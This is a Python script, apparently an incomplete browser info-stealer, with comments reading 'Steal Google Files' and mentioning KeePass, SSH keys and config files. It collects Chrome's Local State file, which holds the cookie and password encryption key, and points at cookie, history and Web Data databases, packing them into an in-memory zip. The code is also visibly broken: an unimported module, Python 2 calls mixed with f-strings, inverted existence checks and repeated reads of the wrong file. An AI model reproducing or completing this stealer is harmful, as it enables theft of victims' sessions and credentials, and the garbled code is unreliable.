import os 
import sys
import zipfile
import io # https://stackoverflow.com/questions/2463770/python-in-memory-zip-library

# (keepass, SSH keys, config files) 

class InMemoryZip(object):
    def __init__(self):
        # Create the in-memory file-like object
        self.in_memory_zip = StringIO.StringIO()

    def append(self, filename_in_zip, file_contents):
        '''Appends a file with name filename_in_zip and contents of 
        file_contents to the in-memory zip.'''
        # Get a handle to the in-memory zip in append mode
        zf = zipfile.ZipFile(self.in_memory_zip, "a", zipfile.ZIP_DEFLATED, False)

        # Write the file to the in-memory zip
        zf.writestr(filename_in_zip, file_contents)

        # Mark the files as having been created on Windows so that
        # Unix permissions are not inferred as 0000
        for zfile in zf.filelist:
            zfile.create_system = 0        

        return self

    def read(self):
        '''Returns a string with the contents of the in-memory zip.'''
        self.in_memory_zip.seek(0)
        return self.in_memory_zip.read()

    def writetofile(self, filename):
        '''Writes the in-memory zip to a file.'''
        f = file(filename, "w")
        f.write(self.read())
        f.close()

config = {
   "encrypt" : False, 
   "static_files" : [
       ""
   ],
   "zip_dir" : ""
}

imz = InMemoryZip()

local_data = os.getenv('LOCALAPPDATA')

# Steal Google Files

profiles = [
    'Default',
    'Profile 1',
    'Profile 2',
    'Profile 3',
    'Profile 4',
    'Profile 5',
]


master_key_path = f'{local_data}\\Google\\Chrome\\User Data\\Local State'

if os.path.exists(master_key_path):
    with open(master_key_path, "r", encoding="utf-8") as f:
            content = f.read()
            imz.append("Local State", content)

cookie_db = f'{local_data}\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'

if not os.path.exists(cookie_db):
    with open(master_key_path, "rb", encoding="utf-8") as f:
        content = f.read()
        imz.append("Local State", content)

history = f'{local_data}\\Google\\Chrome\\User Data\\Default\\History'

if not os.path.exists(cookie_db):
    with open(master_key_path, "rb", encoding="utf-8") as f:
        content = f.read()
        imz.append("Local State", content)


history = f'{local_data}\\Google\\Chrome\\User Data\\Default\\Web Data'

if not os.path.exists(cookie_db):
    with open(master_key_path, "rb", encoding="utf-8") as f:
        content = f.read()
        imz.append("Local State", content)

